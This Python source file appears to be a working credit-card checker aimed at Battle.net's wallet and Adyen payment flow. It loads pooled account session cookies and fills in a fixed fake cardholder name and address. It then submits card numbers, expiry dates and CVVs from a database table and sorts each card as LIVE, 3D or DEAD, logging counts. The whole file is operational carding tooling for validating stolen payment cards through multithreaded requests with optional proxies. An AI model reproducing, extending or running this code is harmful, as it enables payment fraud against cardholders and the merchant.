import random
import time
from log.log import *
import httpx
import utils.read_account
import threading
import utils.thread_lock
import utils.thread_lock as tlock
from datetime import datetime
import execjs
import utils.operate_mysql as mpool
import utils.mysqlDao
import requests
from utils.config import settings


def add_wallet_clearSession(client):
    response = None
    try:
        url = "https://us.wallet.battle.net/wallet/add-wallet/CREDIT_CARD?parentHostname=https://account.battle.net&currency=USD&flow=ADD_WALLET&theme=ACCOUNT_SETTINGS&locale=en-us&returnUrl=https%3A%2F%2Faccount.battle.net%2Fpayment%2Fadd&clearSession"
        headers = {
            'authority': 'us.wallet.battle.net',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://account.battle.net/',
            'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        }

        response = client.get(url, headers=headers, follow_redirects=False)

        location = response.headers.get("Location", "")
        # logger.debug(f"add_wallet_clearSession_url: {url}")
        # logger.debug(f"add_wallet_clearSession_location: {location}")
        return location
    except Exception as e:
        logger.error(e)
    finally:
        if response is not None:
            response.close()


def add_wallet_add(client, location_url):
    response = None
    try:
        url = "https://us.wallet.battle.net" + location_url
        headers = {
            'authority': 'us.wallet.battle.net',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://account.battle.net/',
            'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        }

        response = client.get(url, headers=headers, follow_redirects=False)

        location = response.headers.get("Location", "")
        # logger.debug(f"add_wallet_add_url: {url}")
        # logger.debug(f"add_wallet_add_location: {location}")
        return location
    except Exception as e:
        logger.error(e)
    finally:
        if response is not None:
            response.close()


def add_wallet_add_shop(client, location_url):
    response = None
    try:
        url = location_url
        headers = {
            'authority': 'us.account.battle.net',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://account.battle.net/',
            'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        }

        response = client.get(url, headers=headers, follow_redirects=False)

        location = response.headers.get("Location", "")
        # logger.debug(f"add_wallet_add_shop_url: {url}")
        # logger.debug(f"add_wallet_add_shop_location: {location}")

        return location
    except Exception as e:
        logger.error(e)
    finally:
        if response is not None:
            response.close()


def add_wallet_jsessionid(client, location_url):
    response = None
    try:
        url = location_url
        headers = {
            'authority': 'us.wallet.battle.net',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://account.battle.net/',
            'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        }

        response = client.get(url, headers=headers, follow_redirects=False)

        jsessionid = response.cookies.get("JSESSIONID", "")
        # logger.debug(f"add_wallet_jsessionid_url: {url}")
        logger.debug(f"jsessionid: {response.status_code}|{jsessionid}")
        return response.headers.get("Location", ""), jsessionid, response.status_code
    except Exception as e:
        logger.error(e)
    finally:
        if response is not None:
            response.close()


def add_wallet_xsrf_token(client, location_url, jsessionid_d):
    response = None
    try:
        url = "https://us.wallet.battle.net" + location_url
        headers = {
            'authority': 'us.wallet.battle.net',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://account.battle.net/',
            'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        }

        response = client.get(url, headers=headers, follow_redirects=False)
        res_header = response.headers
        date_value = res_header['date']
        date_object = datetime.strptime(date_value, "%a, %d %b %Y %H:%M:%S %Z")
        iso_string = date_object.strftime("%Y-%m-%dT%H:%M:%SZ")
        # logger.info(f"res_header:{iso_string}")
        # generation_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ")
        # logger.info(f"ISO-TIME:{generation_time}")
        xsrf_token = response.cookies.get("XSRF-TOKEN", "")
        # logger.debug(f"add_wallet_xsrf_token_url: {url}")
        logger.debug(f"xsrf_token: {response.status_code}|{xsrf_token}")
        return xsrf_token, iso_string
    except Exception as e:
        logger.error(e)
    finally:
        if response is not None:
            response.close()


def address(client, xsrf_token, body):
    response = None
    try:
        url = "https://kr.battle.net/wallet/api/payments/token-credit-card/address"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Referer': 'https://kr.battle.net/wallet/select-address',
            'X-XSRF-TOKEN': xsrf_token,
            'X-Requested-With': 'BnetAngularFrontend',
            'Content-Type': 'application/json',
            'Origin': 'https://kr.battle.net',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }

        response = client.post(url, headers=headers, data=body, follow_redirects=False)
        # logger.debug(f"address_url: {url}")
        logger.debug(f"address: {response.status_code}|{response.text}")
        return response.text

    except Exception as e:
        logger.error(e)
    finally:
        if response is not None:
            response.close()


def details(client):
    response = None
    try:
        url = "https://kr.battle.net/wallet/api/payments/token-credit-card/adyen/details"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Referer': 'https://kr.battle.net/wallet/collect-payment-adyen',
            'X-Requested-With': 'BnetAngularFrontend',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }

        response = client.get(url, headers=headers)
        # logger.debug(f"details_url: {url}")
        # logger.debug(f"details: {response.json().get('originKey')}")
        return response.json().get('originKey')

    except Exception as e:
        logger.error(e)
    finally:
        if response is not None:
            response.close()


def adyen_complete(client, xsrf_token, generation_time, ci):
    response = None
    try:
        url = "https://kr.battle.net/wallet/api/payments/token-credit-card/adyen/complete"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Referer': 'https://kr.battle.net/wallet/collect-payment-adyen',
            'X-XSRF-TOKEN': xsrf_token,
            'X-Requested-With': 'BnetAngularFrontend',
            'Content-Type': 'application/json',
            'Origin': 'https://kr.battle.net',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        cc = ci.get('card_number')
        number = f"{cc[:4]} {cc[4:8]} {cc[8:12]} {cc[12:]}"
        cardData = {
            "number": number,
            "cvc": ci.get('cvv'),
            "holderName": "Sneller Eunice",
            "expiryMonth": ci.get('month'),
            "expiryYear": ci.get('year'),
            "generationtime": generation_time
        }
        ios = open('./pay.js', 'r', encoding='utf-8').read()
        jsd = execjs.compile(ios)
        ccnum = jsd.call('ccnum_encrypt', cardData.get('number'), cardData.get('generationtime'))
        expm = jsd.call('expm_encrypt', cardData.get('expiryMonth'), cardData.get('generationtime'))
        expy = jsd.call('expy_encrypt', cardData.get('expiryYear'), cardData.get('generationtime'))
        cvv = jsd.call('cvv_encrypt', cardData.get('cvc'), cardData.get('generationtime'))
        json_data = {
            'collectPaymentAdyenFields': {
                'encryptedExpiryMonth': str(expm),
                'encryptedExpiryYear': str(expy),
                'encryptedSecurityCode': str(cvv),
                'encryptedCardNumber': str(ccnum),
            },
            'browserInfo': {
                'colorDepth': 24,
                'javaEnabled': False,
                'javaScriptEnabled': True,
                'language': 'zh-CN',
                'screenHeight': 1080,
                'screenWidth': 1920,
                'timeZoneOffset': '-480',
            },
            'challengeReturnUrl': 'https://kr.battle.net/wallet/continue-token?returnUrl=https%3A%2F%2Faccount.battle.net%2Fpayment%2Fadd&saveWallet=true',
        }

        response = client.post(url, headers=headers, json=json_data, follow_redirects=False)
        # logger.debug(f"adyen_complete: {url}")
        logger.debug(f"adyen_complete: {response.status_code}|{response.json()}")
        return response.status_code, response.json()
    except Exception as e:
        logger.error(e)
    finally:
        if response is not None:
            response.close()


def account_add_wallet_add_shop(client, location_url):
    response = None
    try:
        url = location_url
        headers = {
            'User-Agent': settings.http_user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'Referer': 'https://account.battle.net/',
        }
        response = client.get(url, headers=headers, follow_redirects=False)
        return response.headers.get('Location', '')
    except Exception as e:
        logger.error(e)
        return ""
    finally:
        if response is not None:
            response.close()


class checker(threading.Thread):

    def __init__(self, threadID):
        threading.Thread.__init__(self)
        self.threadID = threadID

    def run(self):
        global index_live
        global index_dead
        global live_lock
        global dead_lock
        global table_name
        stop_flag = 99

        while stop_flag > 0:

            client = None
            card = None
            acc = None
            try:
                acc = utils.read_account.read_account(source=settings.account_source,
                                                     fallback_file=settings.account_file)
                if not acc:
                    logger.warning("未获取到账号，等待配置完善后重试")
                    time.sleep(3)
                    continue

                cookies_str = acc.get('cookies')
                # split_cookies_str = cookies_str.split('; JSESSIONID=')
                BA_tassadar_Cookie = acc.get('BA_tassadar_Cookie_lst')
                cookies = f"{cookies_str}; BA-tassadar={BA_tassadar_Cookie}"
                coo = {}
                for ls in cookies.split(';'):
                    keys = ls.strip().split('=')
                    if len(keys) == 2:
                        coo[keys[0]] = keys[1]

                # BA_tassadar_Cookie_lst = {
                #     'BA-tassadar' : acc.get('BA_tassadar_Cookie_lst')
                # }

                timeout = httpx.Timeout(timeout=30.0, connect=30.0, read=30.0, write=30.0)
                client_kwargs = dict(
                    verify=False,
                    cookies=coo,
                    follow_redirects=False,
                    timeout=timeout,
                    http2=True,
                )
                if settings.proxy_url:
                    client_kwargs['proxy'] = settings.proxy_url
                client = httpx.Client(**client_kwargs)

                logger.debug(f"THREAD-{self.threadID}: {acc.get('BA_tassadar_Cookie_lst')}")

                location_url_a = add_wallet_clearSession(client)

                location_url_b = add_wallet_add(client, location_url_a)

                location_url_c = add_wallet_add_shop(client, location_url_b)  # 返回授权重定向地址

                location_url_cc = account_add_wallet_add_shop(client, location_url_c)

                location_url_d, jsessionid_d, is_ok = add_wallet_jsessionid(client, location_url_cc)

                if is_ok != 302:
                    # db = None
                    # try:
                    #     db = utils.mysqlDao.Mysql()
                    #     sql = "UPDATE acc2 SET isValid = %s WHERE BA_tassadar_Cookie_lst = %s"
                    #     db.update(sql, [0, acc.get('BA_tassadar_Cookie_lst')])
                    #     current_time = datetime.now()
                    #     sql = "UPDATE acc2 SET isValidModifiedTime = %s WHERE BA_tassadar_Cookie_lst = %s"
                    #     db.update(sql, [current_time, acc.get('BA_tassadar_Cookie_lst')])
                    # except Exception as e:
                    #     logger.error(e)
                    # finally:
                    #     if db is not None:
                    #         db.dispose(1)
                    continue


                xsrf_token, generationtime = add_wallet_xsrf_token(client, location_url_d, jsessionid_d)

                # 提交地址信息
                body = '{"region":"AL","countryAlpha3":"USA","lastName":"Sneller","firstName":"Eunice","addressLine1":"3543 Joyce Street","city":"Mobile","postalCode":"36606"}'
                # new_cookies_str = "XSRF-TOKEN=" + xsrf_token + ";" + "JSESSIONID=" + jsessionid_d + ";" + cookies_str

                res = "braintree"
                while True:
                    if "init-token-error" in res:
                        db = None
                        try:
                            db = utils.mysqlDao.Mysql()
                            sql = "UPDATE acc2 SET isValid = %s WHERE BA_tassadar_Cookie_lst = %s"
                            db.update(sql, [4, acc.get('BA_tassadar_Cookie_lst')])
                            current_time = datetime.now()
                            sql = "UPDATE acc2 SET isValidModifiedTime = %s WHERE BA_tassadar_Cookie_lst = %s"
                            db.update(sql, [current_time, acc.get('BA_tassadar_Cookie_lst')])
                        except Exception as e:
                            logger.error(e)
                        finally:
                            if db is not None:
                                db.dispose(1)
                            break

                    elif "collect-payment-iframe" in res or "braintree" in res:
                        res = address(client, xsrf_token, body)
                    elif "adyen" in res:
                        break
                    else:
                        return

                if "init-token-error" in res:
                    continue

                details(client)
                # 连接数据库

                # threadLock.acquire()
                with tlock.acquire(card_lock):
                    cards = mpool.selectOne(table_name)
                # threadLock.release()
                if not cards:
                    logger.info("卡池为空，等待补充")
                    break
                for card in cards:
                    # 提交卡信息
                    ci = dict()
                    ci['card_number'] = card['ccnum'].replace(" ", "")
                    if len(card['expy']) == 2:
                        ci['year'] = f"20{card['expy']}"
                    else:
                        ci['year'] = card['expy']
                    if len(card['expm']) == 1:
                        ci['month'] = card['expm'].zfill(2)
                    else:
                        ci['month'] = card['expm']

                    if len(card['cvv']) < 3:
                        ci['cvv'] = card['cvv'].zfill(3)
                    else:
                        ci['cvv'] = card['cvv']
                    is_live, msg = adyen_complete(client, xsrf_token, generationtime, ci)

                    if is_live == 200:
                        if msg.get('tokenId') is not None:
                            if 'completeError' in msg:
                                last_check = 1
                                with tlock.acquire(live_lock):
                                    mpool.updateOneById(table_name, last_check, card)
                                    index_live += 1
                                    logger.success(f"card_info:{ci}:LIVE")
                            else:
                                last_check = 13
                                with tlock.acquire(dead_lock):
                                    mpool.updateOneById(table_name, last_check, card)
                                    index_dead += 1
                                    logger.error(f"card_info:{ci}:3D")
                        else:
                            last_check = 4
                            with tlock.acquire(dead_lock):
                                mpool.updateOneById(table_name, last_check, card)
                                index_dead += 1
                                logger.error(f"card_info:{ci}:DEAD")
                        logger.info(
                            f"Live:{index_live}, Dead:{index_dead}, 活率:{(index_live / (index_dead + index_live)) * 100}%")
                    else:
                        # 检查卡是否正确
                        last_check = None
                        mpool.updateOneById(table_name, last_check, card)

            except Exception as e:
                last_check = None
                if mpool is not None and card is not None:
                    mpool.updateOneById(table_name, last_check, card)
                logger.error(e)
                continue

            finally:
                try:
                    stop_flag = mpool.selectCount(table_name)[0].get('count')
                except Exception as e:
                    logger.error(f"获取剩余卡量失败: {e}")
                    stop_flag = 0
                if client is not None:
                    client.close()
                time.sleep(random.randint(1, 5))


if __name__ == '__main__':

    index_live = 0
    index_dead = 0
    card_lock = threading.Lock()
    live_lock = threading.Lock()
    dead_lock = threading.Lock()
    table_name = input("输入表名:") or settings.default_table

    num_threads = 1  # 设置线程数量

    threads = []

    for _ in range(num_threads):
        thread = checker(_)
        thread.start()
        threads.append(thread)

    for t in threads:
        t.join()

    logger.info('Finish')
